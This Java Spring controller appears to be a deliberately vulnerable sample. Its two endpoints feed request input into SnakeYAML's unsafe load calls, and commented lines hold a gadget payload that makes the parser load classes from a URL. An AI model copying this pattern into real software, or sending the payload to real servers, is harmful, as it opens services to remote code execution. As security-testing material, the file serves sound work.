package com.freedom.javacodesimple.api.yaml;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.w3c.dom.Document;
import org.xml.sax.SAXException;
import org.yaml.snakeyaml.Yaml;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;

@RestController
@RequestMapping("/api")
public class YamlController {
    @GetMapping("/yaml/bad01")
    public String yaml01(String payload) throws IOException, ParserConfigurationException, SAXException {
//        String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "  + "[[!!java.net.URL [\"http://localhost\"]]]]";
        Yaml yaml = new Yaml();
//        Object obj = yaml.load(malicious);
        Object obj = yaml.loadAs(payload,null);
        return "success";
    }

    @GetMapping("/yaml/bad02")
    public String yaml02(String payload) throws IOException, ParserConfigurationException, SAXException {
//        String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "  + "[[!!java.net.URL [\"http://localhost\"]]]]";
        Yaml yaml = new Yaml();
        Object obj = yaml.load(payload);
        return "success";
    }
}
